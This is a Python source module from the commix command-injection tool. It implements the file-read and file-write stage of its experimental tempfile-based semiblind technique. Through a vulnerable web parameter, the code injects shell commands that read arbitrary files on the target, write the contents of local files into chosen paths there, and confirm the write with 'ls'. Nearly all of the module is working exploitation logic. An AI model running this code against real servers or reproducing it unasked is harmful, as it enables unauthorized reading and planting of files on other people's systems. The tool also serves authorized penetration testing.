#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_injector

"""
 The "tempfile-based" injection technique on Semiblind OS Command Injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""

def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell):
      
  # Read file
  if menu.options.file_read:
    file_to_read = menu.options.file_read
    cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
    shell = output 
    shell = "".join(str(p) for p in shell)
    if shell:
      if menu.options.verbose:
	print ""
      sys.stdout.write(colors.BOLD + "\n\n (!) Contents of file " + colors.UNDERL + file_to_read + colors.RESET + " : ")
      sys.stdout.flush()
      print shell
    else:
     sys.stdout.write("\n" + colors.BGRED + "(x) Error: It seems that you don't have permissions to read the '"+ file_to_read + "' file.\n" + colors.RESET)
     sys.stdout.flush()
     
  #  Write file
  if menu.options.file_write:
    file_to_write = menu.options.file_write
    if not os.path.exists(file_to_write):
      sys.stdout.write("\n" + colors.BGRED + "(x) Error: It seems that the '"+ file_to_write + "' is not exists." + colors.RESET)
      sys.stdout.flush()
      sys.exit(0)
      
    if os.path.isfile(file_to_write):
      with open(file_to_write, 'r') as content_file:
	content = [line.replace("\n", " ") for line in content_file]
      content = "".join(str(p) for p in content).replace("'","\"")
    else:
      sys.stdout.write("\n" + colors.BGRED + "(x) Error: It seems that '"+ file_to_write + "' is not a file." + colors.RESET)
      sys.stdout.flush()
      
    if not settings.TMP_PATH in menu.options.file_dest:
      file_name = os.path.split(menu.options.file_dest)[1]
      dest_to_write = settings.TMP_PATH +  file_name
    else:
      dest_to_write = menu.options.file_dest
    cmd = settings.FILE_WRITE + " '"+ content + "' "
    
    # Check the file-destination
    if os.path.split(menu.options.file_dest)[1] == "" :
      dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
    elif os.path.split(menu.options.file_dest)[0] == "/":
      dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
    else:
      dest_to_write = menu.options.file_dest
    OUTPUT_TEXTFILE = dest_to_write
    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
    shell = output
    shell = "".join(str(p) for p in shell)
    
    # Check if file exists!
    cmd = "echo $(ls " + dest_to_write + ")"
    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
    shell = output
    shell = "".join(str(p) for p in shell)
    if shell:
      if menu.options.verbose:
	print ""
      sys.stdout.write(colors.BOLD + "\n(!) The " + colors.UNDERL + shell + colors.RESET + colors.BOLD +" file was created successfully!\n" + colors.RESET)
      sys.stdout.flush()
    else:
     sys.stdout.write("\n" + colors.BGRED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_write + "' file.\n" + colors.RESET)
     sys.stdout.flush()

# eof